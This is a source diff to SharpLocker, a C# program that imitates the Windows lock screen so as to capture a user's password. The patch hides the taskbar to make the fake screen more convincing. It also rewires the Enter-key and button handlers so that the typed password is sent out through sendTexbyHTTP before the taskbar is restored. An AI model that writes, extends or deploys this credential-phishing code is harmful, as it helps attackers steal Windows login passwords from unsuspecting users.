@@ -21,6 +21,7 @@ namespace SharpLocker
         public LockScreenForm()
         {
             InitializeComponent();
+            Taskbar.Hide();
             FormBorderStyle = FormBorderStyle.None;
             WindowState = FormWindowState.Normal;
             StartPosition = FormStartPosition.Manual;
@@ -203,29 +204,6 @@ namespace SharpLocker
             base.OnClosing(e);
         }
 
-        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
-        {
-            Console.WriteLine(PasswordTextBox);
-        }
-        private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
-        {
-            if (e.KeyCode == Keys.Enter)
-            {
-                sendTexbyHTTP(PasswordTextBox.Text);
-            }
-        }
-
-        private void pictureBox3_Click(object sender, EventArgs e)
-        {
-            Application.Exit();
-        }
-
-        private void button1_Click_1(object sender, EventArgs e)
-        {
-            sendTexbyHTTP(PasswordTextBox.Text);
-            Application.Exit();
-        }
-
         private void show_MouseDown(object sender, MouseEventArgs e)
         {
             PasswordTextBox.UseSystemPasswordChar = false;
@@ -235,6 +213,22 @@ namespace SharpLocker
         {
             PasswordTextBox.UseSystemPasswordChar = true;
         }
-    
+
+        private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+                sendTexbyHTTP(PasswordTextBox.Text);
+                Taskbar.Show();
+            }
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            sendTexbyHTTP(PasswordTextBox.Text);
+            Taskbar.Show();
+            Application.Exit();
+        }
+
     }
 }
